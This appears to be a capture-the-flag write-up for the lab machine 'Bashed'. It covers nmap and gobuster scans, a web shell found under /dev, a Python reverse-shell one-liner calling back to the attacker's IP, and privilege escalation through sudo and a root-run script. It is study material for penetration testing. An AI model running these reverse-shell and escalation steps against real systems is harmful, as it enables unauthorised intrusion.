![[Pasted image 20240720104651.png]]

**Ping** 
```
ping 10.10.10.68
```
![[Pasted image 20240613190619.png]]

Nmap Default Scan
```
nmap 10.10.10.68 -oN dnmap
```
![[Pasted image 20240613190713.png]]
We have only one open Port.

All port Scan
```
nmap 10.10.10.68 -sC -sV -p- --open -T5 -oN anmap
```
![[Pasted image 20240613190941.png]]
No other ports found.

On Port 80
![[Pasted image 20240613190924.png]]

Gobuster Scan 
```
gobuster dir -u http://10.10.10.68// -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,conf -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240613204213.png]]

/dev has some php files
![[Pasted image 20240613205528.png]]

got a semi-Interactive shell from phpbash.min.php
![[Pasted image 20240613205624.png]]

Will get Proper Reverse shell, So will check for **nc** any **python** 
```
which nc
which python
```
![[Pasted image 20240613205812.png]]

We can get reverse shell using bot nc and python, I'm going with python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.41",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240613210003.png]]
got it...!

Will upgrade the shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![[Pasted image 20240613210150.png]]

Got the user.txt in home directory of user arrexel
![[Pasted image 20240613210348.png]]

Will jump to Privilege Escalation.....!

Will check sudo permissions
```
sudo -l
```
![[Pasted image 20240613211158.png]]

So we can switch to scriptmanager
```
sudo -u scriptmanager -i
```
![[Pasted image 20240613211305.png]]

So the script manager as full and root access to scripts directory
```
ls -la 
```
![[Pasted image 20240613213127.png]]

lets navigate to scripts directory and modify the mod or add new code for reverse shell as root.
![[Pasted image 20240613213229.png]]

Then execute the code to get reverse shell as root
```
python test.py
```
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240613213400.png]]

Got root.txt in root directory
![[Pasted image 20240613213440.png]]


Done with bashed......:)